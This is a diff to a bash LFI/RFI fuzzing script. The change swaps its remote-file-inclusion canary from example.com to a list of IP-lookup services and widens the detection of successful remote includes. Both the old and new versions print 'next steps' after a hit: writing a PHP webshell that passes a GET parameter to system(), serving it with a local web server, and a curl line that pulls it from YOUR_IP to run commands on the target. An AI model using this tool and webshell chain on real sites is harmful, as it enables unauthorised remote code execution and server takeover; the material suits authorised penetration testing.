@@ -40,7 +40,7 @@ usage() {
     echo -e "  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ in URL)"
     echo -e "  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)"
     echo -e "  ${CYAN}-w <path>${RESET}    LFI wordlist path (default: auto-resolve LFI-Jhaddix.txt)"
-    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI canary (default: http://example.com)"
+    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI canary (default: tries ifconfig.me, ipinfo.io, example.com)"
     echo -e "  ${CYAN}-c <cookie>${RESET}  Cookie string e.g. "PHPSESSID=abc123""
     echo -e "  ${CYAN}-H <header>${RESET}  Extra header e.g. "Authorization: Bearer token""
     echo -e "  ${CYAN}-o <file>${RESET}    Save results to file"
@@ -228,31 +228,49 @@ detect_lfi() {
 #   POSSIBLE   — PHP error/warning shows the server tried but was blocked
 #   NOT VULN   — no evidence of remote fetch attempt
 detect_rfi() {
-    local body="$1"
+    local body="$1" canary="${2:-}"
 
-    # Level 1 — content from the canary URL appeared in the response.
-    # We use example.com which returns a simple known HTML page with no redirects.
-    # Detect its title tag as confirmation.
+    # Level 1 — detect content from the specific canary that was used
+
+    # ifconfig.me returns plain text containing "IP Address:" or similar
+    if echo "$body" | grep -qiE 'ip_addr:|Remote IP:|Your IP is|"ip":'; then
+        echo "Remote fetch confirmed — IP info service response found in page"
+        return 0
+    fi
+
+    # example.com title tag
     if echo "$body" | grep -qiE '<title>Example Domain</title>|This domain is for use in illustrative'; then
-        echo "Remote file content included in response (example.com content found)"
+        echo "Remote fetch confirmed — example.com content found in page"
         return 0
     fi
 
-    # Also catch robots.txt markers if -r was overridden to point at a robots.txt
-    if echo "$body" | grep -qE '^User-agent:|^Disallow:|^Sitemap:'; then
-        echo "Remote file content included in response (robots.txt markers found)"
+    # robots.txt markers (if user supplied -r pointing at a robots.txt)
+    if echo "$body" | grep -qP '^User-agent:\s|^Disallow:\s|^Sitemap:\s'; then
+        echo "Remote fetch confirmed — robots.txt content found in page"
         return 0
     fi
 
-    # Level 2 — PHP warning/error reveals the server tried to fetch a URL.
-    # allow_url_include may be off, or outbound traffic is filtered — still useful.
-    if echo "$body" | grep -qiE         '"'"'failed to open stream|allow_url_include|Connection refused|getaddrinfo|No route to host|Warning.*include|Warning.*require|Fatal error.*include'"'"'; then
-        echo "POSSIBLE — server attempted remote fetch but was blocked (PHP warning found)"
+    # Generic: any large block of HTML from a remote page appearing in response
+    # If the canary host appears as a link or string in the body, the include worked
+    if [[ -n "$canary" ]]; then
+        local canary_host
+        canary_host=$(echo "$canary" | grep -oP '(?<=://)([^/]+)')
+        if [[ -n "$canary_host" ]] && echo "$body" | grep -qF "$canary_host"; then
+            echo "Remote fetch confirmed — canary hostname ($canary_host) reflected in response"
+            return 0
+        fi
+    fi
+
+    # Level 2 — PHP error/warning proves the parameter reaches include()
+    # even if the fetch was blocked by config or firewall
+    if echo "$body" | grep -qiE         '"'"'failed to open stream|allow_url_include|Connection refused|getaddrinfo failed|No route to host|Warning.*include\(|Warning.*require\(|Fatal error.*include'"'"'; then
+        echo "POSSIBLE — PHP warning shows parameter reaches include() but fetch was blocked"
         return 2
     fi
 
     return 1
 }
+
 
 # ── HTTP request ──────────────────────────────────────────────────────────────
 send_request() {
@@ -287,7 +305,7 @@ build_url() {
 # ── Main ──────────────────────────────────────────────────────────────────────
 main() {
     local url="" param="" test_type="both" wordlist_path=""
-    local remote_url="http://example.com"
+    local remote_url="http://ifconfig.me/all"
     local cookie="" extra_header="" outfile=""
     local delay=0 stop_first=0 verbose=0
 
@@ -395,64 +413,104 @@ main() {
     if [[ "$test_type" == "rfi" || "$test_type" == "both" ]]; then
         sep
         info "Starting RFI tests..."
-        info "Using ${remote_url} as canary (override with -r <url>)"
-        info "RFI requires allow_url_include=On in PHP to succeed"
         sep
         echo ""
 
-        # Use example.com as the canary — simple HTML page, no redirects, unique title tag.
-        # Override with -r <url> if the target has no outbound internet access.
-        local rfi_probe="$remote_url"
+        # Canary URLs — plain text, no redirects, unique detectable content.
+        # We try each one in sequence so if the server can reach one we get a hit.
+        # User can override all of these with -r <url>.
+        local -a rfi_canaries
+        if [[ "$remote_url" != "http://example.com" ]]; then
+            # User supplied their own — use only that
+            rfi_canaries=("$remote_url")
+        else
+            # Default canary list — plain text endpoints, no redirects
+            rfi_canaries=(
+                "http://ifconfig.me/all"          # returns plain text with IP/UA info
+                "http://ipinfo.io/json"           # returns JSON — unique and detectable
+                "http://example.com"              # HTML fallback
+            )
+        fi
 
-        while IFS= read -r payload; do
-            [[ -z "$payload" || "$payload" == \#* ]] && continue
+        info "Canary URLs to try:"
+        for c in "${rfi_canaries[@]}"; do
+            detail "  $c"
+        done
+        warn "RFI requires allow_url_include=On (and allow_url_fopen=On) in PHP"
+        echo ""
 
-            local target_url
-            target_url=$(build_url "$url" "$param" "$payload")
-            local response
-            response=$(send_request "$target_url" "$cookie" "$extra_header")
-            local rfi_exit
-            ((tested++))
+        local rfi_found=0
 
-            local match=""
-            match=$(detect_rfi "$response")
-            rfi_exit=$?
+        for rfi_probe in "${rfi_canaries[@]}"; do
+            info "Testing canary: $rfi_probe"
+            local canary_hit=0
 
-            if [[ $rfi_exit -eq 0 ]]; then
-                vuln "[RFI CONFIRMED] $payload"
-                detail "URL    : $target_url"
-                detail "Reason : $match"
-                detail "Impact : allow_url_include=On — server fetched and included the remote URL"
-                echo ""
-                echo -e "${YELLOW}  Next steps:${RESET}"
-                echo -e "${YELLOW}  1. Host a PHP webshell:  echo '<?php system(\$_GET["c"]); ?>' > shell.php${RESET}"
-                echo -e "${YELLOW}  2. Serve it:             python3 -m http.server 8000${RESET}"
-                echo -e "${YELLOW}  3. Exploit:              ${url/FUZZ/http:\/\/YOUR_IP:8000\/shell.php?c=id}${RESET}"
-                echo ""
-                [[ -n "$outfile" ]] && echo "[RFI CONFIRMED] $target_url | $match" >> "$outfile"
-                ((vuln_count++))
-                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
+            while IFS= read -r payload; do
+                [[ -z "$payload" || "$payload" == \#* ]] && continue
 
-            elif [[ $rfi_exit -eq 2 ]]; then
-                warn "[RFI POSSIBLE] $payload"
-                detail "URL    : $target_url"
-                detail "Reason : $match"
-                detail "Impact : Server attempted fetch but was blocked — may work with your own IP"
-                echo ""
-                echo -e "${CYAN}  Suggestion: the server tried to reach out but was blocked.${RESET}"
-                echo -e "${CYAN}  Try pointing at your own machine (target may block external traffic):${RESET}"
-                echo -e "${CYAN}  Re-run with: -r http://YOUR_IP/test.txt${RESET}"
-                echo ""
-                [[ -n "$outfile" ]] && echo "[RFI POSSIBLE] $target_url | $match" >> "$outfile"
-                ((vuln_count++))
-                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
+                local target_url
+                target_url=$(build_url "$url" "$param" "$payload")
+                local response
+                response=$(send_request "$target_url" "$cookie" "$extra_header")
+                local rfi_exit
+                ((tested++))
 
-            else
-                [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
-            fi
+                local match=""
+                match=$(detect_rfi "$response" "$rfi_probe")
+                rfi_exit=$?
 
-            [[ "$delay" != "0" ]] && sleep "$delay"
-        done < <(rfi_payloads "$rfi_probe")
+                [[ "$verbose" -eq 1 ]] && detail "[$rfi_exit] $payload"
+
+                if [[ $rfi_exit -eq 0 ]]; then
+                    vuln "[RFI CONFIRMED] $payload"
+                    detail "Canary : $rfi_probe"
+                    detail "URL    : $target_url"
+                    detail "Reason : $match"
+                    detail "Impact : allow_url_include=On — server fetched and included the remote URL"
+                    echo ""
+                    echo -e "${YELLOW}  Next steps:${RESET}"
+                    echo -e "${YELLOW}  1. Host a webshell: echo '<?php system(\$_GET["c"]); ?>' > shell.php${RESET}"
+                    echo -e "${YELLOW}  2. Serve it:        python3 -m http.server 8000${RESET}"
+                    echo -e "${YELLOW}  3. Trigger RCE:     curl "http://TARGET/page.php?page=http://YOUR_IP:8000/shell.php&c=id"${RESET}"
+                    echo ""
+                    [[ -n "$outfile" ]] && echo "[RFI CONFIRMED] $target_url | $rfi_probe | $match" >> "$outfile"
+                    ((vuln_count++))
+                    rfi_found=1
+                    canary_hit=1
+                    [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break 2; }
+                    break   # found a working payload for this canary — move to next canary
+
+                elif [[ $rfi_exit -eq 2 ]]; then
+                    warn "[RFI POSSIBLE] $payload"
+                    detail "Canary : $rfi_probe"
+                    detail "URL    : $target_url"
+                    detail "Reason : $match"
+                    echo ""
+                    echo -e "${CYAN}  Server tried to fetch the URL but was blocked.${RESET}"
+                    echo -e "${CYAN}  This confirms the parameter reaches include() — try your own IP:${RESET}"
+                    echo -e "${CYAN}  Re-run: $0 -u "$url" -t rfi -r http://YOUR_IP/test.txt${RESET}"
+                    echo ""
+                    [[ -n "$outfile" ]] && echo "[RFI POSSIBLE] $target_url | $rfi_probe | $match" >> "$outfile"
+                    ((vuln_count++))
+                    rfi_found=1
+                    canary_hit=1
+                    [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break 2; }
+                    break
+
+                fi
+
+                [[ "$delay" != "0" ]] && sleep "$delay"
+            done < <(rfi_payloads "$rfi_probe")
+
+            # If this canary got a hit, no need to try the others
+            [[ "$canary_hit" -eq 1 ]] && break
+        done
+
+        if [[ "$rfi_found" -eq 0 ]]; then
+            warn "No RFI detected with external canaries."
+            warn "If the server has no outbound internet access, try your own IP:"
+            warn "  $0 -u "$url" -t rfi -r http://YOUR_IP/test.txt"
+        fi
     fi
 
     # ── Summary ───────────────────────────────────────────────────────────────
